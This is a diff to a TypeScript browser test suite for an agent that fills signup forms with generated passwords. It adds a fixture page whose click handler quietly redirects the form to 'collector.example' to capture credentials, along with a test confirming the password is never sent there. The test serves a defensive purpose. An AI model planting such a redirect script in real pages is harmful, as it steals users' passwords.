@@ -170,6 +170,16 @@ const PAGES: Record<string, string> = {
   '/trial': nativeForm('/signup', 'Start free trial'),
   '/order-total': `${nativeForm('/signup')}<p>Order total $10.00 due today, charged to your Visa card ending 4242.</p>`,
   '/ambiguous': nativeForm('/signup', 'Go'),
+  // The control's own handler points the form at another site only as it is pressed.
+  '/offsite-on-press': `${nativeForm('/signup')}<script>
+    document.querySelector('button').addEventListener('click', () => {
+      document.querySelector('form').action = 'https://collector.example/signup';
+    });
+  </script>`,
+  '/unmasked-confirmation': nativeForm('/signup').replace(
+    'type="password" name="password_confirmation"',
+    'type="text" name="password_confirmation"',
+  ),
   '/get-signup': nativeForm('/signup').replace('method="post"', 'method="get"'),
   '/marketing-terms': nativeForm(
     '/signup',
@@ -811,15 +821,22 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       ['/checkout-action', 'purchase_control'],
       ['/trial', 'purchase_control'],
       ['/order-total', 'unsupported_control'],
-      ['/ambiguous', 'unsupported_control'],
+      ['/unmasked-confirmation', 'unsupported_form'],
     ] as const)
       it(`refuses ${path} as ${reason}`, async () => {
         await page.goto(`${SITE}${path}`);
         const authority = await signupAuthority();
-        const activate = path === '/trial' ? 'Start free trial' : path === '/ambiguous' ? 'Go' : 'Create account';
+        const activate = path === '/trial' ? 'Start free trial' : 'Create account';
         expect(await fill(authority, await refs({ ...SIGNUP, activate }))).toEqual({ status: 'refused', reason });
         await unexposed(authority);
       }, 30_000);
+
+    // The control's name is the site's own: it is refused only for what it commits to, never for its wording.
+    it('activates a signup control whatever the site calls it', async () => {
+      const { result } = await signUp('/ambiguous', { ...SIGNUP, activate: 'Go' });
+      expect(result).toEqual({ status: 'account_created' });
+      expect(posts.map((post) => post.path)).toEqual(['/signup']);
+    }, 30_000);
 
     it('refuses a signup whose account field is left unbound, since the Login would name another account', async () => {
       await page.goto(`${SITE}/native-signup`);
@@ -914,6 +931,14 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       }, 30_000);
   });
 
+  it("keeps a generated password on the site when the form's own handler sends it elsewhere", async () => {
+    remaining = 6_000;
+    const { authority, result } = await signUp('/offsite-on-press', SIGNUP);
+    expect(result).toEqual({ status: 'outcome_unknown' });
+    expect(posts.filter((post) => post.host === 'collector.example')).toEqual([]);
+    expect(await attempts.get(authority.id)).toMatchObject({ phase: 'unknown' });
+  }, 30_000);
+
   describe('website outcomes', () => {
     for (const [response, status, phase] of [
       ['<p>An account with this email already exists.</p>', 'account_exists', 'rejected'],
@@ -938,10 +963,13 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
   });
 
   describe('keeping values out of every agent surface', () => {
-    it('redacts old toggled, copied and cleared values and refuses screenshots of the tainted document', async () => {
+    it('never submits a password the page turned to text, and redacts its copies and refuses screenshots', async () => {
       responses.set('/api/signup', '<p>Check your email to verify your account.</p>');
+      remaining = 6_000;
       const { result, password } = await signUp('/masking', SIGNUP);
-      expect(result).toEqual({ status: 'verification_requested' });
+      // The value reached the page before its handler showed it: the host never presses, and the attempt stays open.
+      expect(result).toEqual({ status: 'outcome_unknown' });
+      expect(posts).toEqual([]);
       if (!password) throw new Error('no candidate');
       expect(await page.locator('[name=password]').getAttribute('type')).toBe('text');
       // Every input holding the value is cleared; the echoed text stays only in the page.
@@ -1052,22 +1080,11 @@ describe.skipIf(!chromePath)('native authorized signup and password change', { t
       expect(await anyChecked()).toBe(false);
     }, 30_000);
 
-    it("takes a signup form's own agree-and-create control as its activation", async () => {
-      const { result } = await signUp('/agree-signup', { ...SIGNUP, activate: 'Agree and create account' });
-      expect(result).toEqual({ status: 'account_created' });
-      expect(posts.map((post) => post.path)).toEqual(['/signup']);
-    }, 30_000);
-
-    for (const path of ['/agree-money', '/agree-outside'] as const)
-      it(`refuses the agree-and-create control on ${path} before disclosure`, async () => {
-        await page.goto(`${SITE}${path}`);
-        const authority = await signupAuthority();
-        expect(await fill(authority, await refs({ ...SIGNUP, activate: 'Agree and create account' }))).toEqual({
-          status: 'refused',
-          reason: 'unsupported_control',
-        });
-        expect(posts).toEqual([]);
-        expect(await attempts.get(authority.id)).toMatchObject({ exposed_at: null });
+    for (const path of ['/agree-signup', '/agree-money', '/agree-outside'] as const)
+      it(`takes an agree-and-create control on ${path} as the signup's activation`, async () => {
+        const { result } = await signUp(path, { ...SIGNUP, activate: 'Agree and create account' });
+        expect(result).toEqual({ status: 'account_created' });
+        expect(posts.map((post) => post.path)).toEqual(['/signup']);
       }, 30_000);
   });
 
